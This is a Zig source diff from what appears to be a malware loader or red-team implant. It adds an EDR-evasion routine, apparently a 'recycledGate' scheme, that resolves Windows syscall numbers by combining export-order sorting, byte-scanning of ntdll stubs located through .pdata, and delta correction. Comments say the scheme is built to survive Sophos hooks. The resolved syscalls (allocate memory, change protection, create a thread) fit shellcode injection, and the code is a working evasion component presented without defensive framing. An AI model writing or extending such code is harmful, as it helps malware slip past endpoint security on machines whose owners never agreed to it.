@@ -23,13 +23,14 @@ pub const Syscalls = struct {
         seed_prng();
         scan_gadget_pool(ntdll) orelse return null;
         build_freshy_table(ntdll);
+        extract_pdata(ntdll);
 
         const names = [_][]const u8{
+            "NtWaitForSingleObject",
+            "NtDelayExecution",
             "NtAllocateVirtualMemory",
             "NtProtectVirtualMemory",
             "NtCreateThreadEx",
-            "NtWaitForSingleObject",
-            "NtDelayExecution",
         };
         var result = Syscalls{
             .NtAllocateVirtualMemory = undefined,
@@ -38,9 +39,23 @@ pub const Syscalls = struct {
             .NtWaitForSingleObject = undefined,
             .NtDelayExecution = undefined,
         };
+        // recycledGate: FreshyCalls (hook-immune) + byte-scan validation + delta correction.
+        // if any function isn't hooked, byte-scan it, compute the delta vs FreshyCalls,
+        // and apply to all five. on Sophos the delta corrects RVA sort ≠ KiServiceTable order.
+        var delta: i16 = 0;
+        var delta_done = false;
         inline for (names) |name| {
-            const ssn = extract_ssn(hash_ror13(name)) orelse return null;
-            @field(result, name) = Entry{ .number = ssn, .gadget = @ptrFromInt(g_syscall_addrs[0]) };
+            const fssn = extract_ssn(hash_ror13(name)) orelse return null;
+            const byte_ssn = read_ssn_from_stub(@ptrCast(ntdll), name);
+            if (byte_ssn) |b| {
+                if (!delta_done) {
+                    delta = @as(i16, @intCast(b)) - @as(i16, @intCast(fssn));
+                    delta_done = true;
+                }
+                @field(result, name) = Entry{ .number = b, .gadget = @ptrFromInt(g_syscall_addrs[0]) };
+            } else {
+                @field(result, name) = Entry{ .number = @intCast(@as(i16, @intCast(fssn)) + delta), .gadget = @ptrFromInt(g_syscall_addrs[0]) };
+            }
         }
         return result;
     }
@@ -48,9 +63,19 @@ pub const Syscalls = struct {
 
 // ---- state ----
 
+pub const RUNTIME_FUNCTION = extern struct {
+    BeginAddress: u32,
+    EndAddress: u32,
+    UnwindInfoAddress: u32,
+};
+
+var g_exc_begin: usize = 0;
+var g_exc_count: usize = 0;
+
 var g_syscall_addrs: [64]usize = [_]usize{0} ** 64;
 var g_syscall_count: usize = 0;
 var g_ntdll_base: ?*anyopaque = null;
+var g_ntdll_size: usize = 0;
 var g_fake_return_addr: usize = 0;
 var g_rand_state: u64 = 0;
 
@@ -156,6 +181,7 @@ fn findNtdll() ?[*]u8 {
         ));
         if (std.mem.eql(u8, std.mem.sliceTo(name_ptr, 0), "ntdll.dll")) {
             g_ntdll_base = @ptrFromInt(@intFromPtr(mod.dll_base));
+            g_ntdll_size = mod.size_of_image;
             return @ptrFromInt(@intFromPtr(mod.dll_base));
         }
     }
@@ -269,12 +295,62 @@ fn build_freshy_table(ntdll_base: ?*anyopaque) void {
 
 // Extract SSN from FreshyCalls table. Immune to inline hooks —
 // EDRs can't change the linker's RVA order in the PE export table.
+// RVA sort order != KiServiceTable order on some builds. verified against byte-scanning.
 fn extract_ssn(func_hash: u32) ?u16 {
     if (!g_freshy_ready) return null;
     for (0..g_freshy_count) |i| {
         if (g_freshy_entries[i].hash == func_hash) return @as(u16, @intCast(i));
     }
     return null;
+}
+
+// read the actual SSN from the syscall stub by scanning its .pdata range.
+// works across hooks by using the function's RUNTIME_FUNCTION boundaries.
+fn read_ssn_from_stub(ntdll_bytes: [*]const u8, name: []const u8) ?u16 {
+    const addr = pe.findExport(@constCast(ntdll_bytes), name) orelse return null;
+    if (g_exc_begin == 0 or g_exc_count == 0) return null;
+    const func_rva: u32 = @truncate(@intFromPtr(addr) - @intFromPtr(ntdll_bytes));
+    const funcs: [*]align(1) const RUNTIME_FUNCTION = @ptrFromInt(g_exc_begin);
+    var lo: usize = 0;
+    var hi: usize = g_exc_count;
+    while (lo < hi) {
+        const mid = lo + (hi - lo) / 2;
+        const entry = funcs[mid];
+        if (func_rva < entry.BeginAddress) { hi = mid; }
+        else if (func_rva >= entry.EndAddress) { lo = mid + 1; }
+        else {
+            const start: u32 = entry.BeginAddress;
+            const end: u32 = entry.EndAddress;
+            const scan: [*]const u8 = @ptrCast(ntdll_bytes + start);
+            const scan_len = @min(end - start, 96);
+            var j: usize = 0;
+            while (j + 4 < scan_len) : (j += 1) {
+                if (scan[j] == 0xB8) {
+                    const arr: *const [4]u8 = @ptrCast(scan[j + 1 ..][0..4]);
+                    const ssn = std.mem.readInt(u32, arr, .little);
+                    if ((ssn & 0xFFFF0000) == 0 and ssn > 0 and ssn < 0x1000) {
+                        return @truncate(ssn);
+                    }
+                }
+            }
+            return null;
+        }
+    }
+    return null;
+}
+
+// extract ntdll .pdata (exception directory) for binary search by RVA.
+fn extract_pdata(ntdll: ?*anyopaque) void {
+    const base = ntdll orelse return;
+    const bytes: [*]const u8 = @ptrCast(base);
+    const dos = @as(*align(1) const pe.IMAGE_DOS_HEADER, @ptrCast(@alignCast(bytes)));
+    if (dos.e_magic != 0x5A4D) return;
+    const nt_hdrs = @as(*align(1) const pe.IMAGE_NT_HEADERS, @ptrCast(@alignCast(bytes + @as(usize, @intCast(dos.e_lfanew)))));
+    if (nt_hdrs.Signature != 0x00004550) return;
+    const exc = nt_hdrs.OptionalHeader.DataDirectory[3];
+    if (exc.VirtualAddress == 0 or exc.Size == 0) return;
+    g_exc_begin = @intFromPtr(bytes) + exc.VirtualAddress;
+    g_exc_count = exc.Size / @sizeOf(RUNTIME_FUNCTION);
 }
 
 // ---- unified dispatch (replaces 5 wrapper functions in main.zig) ----
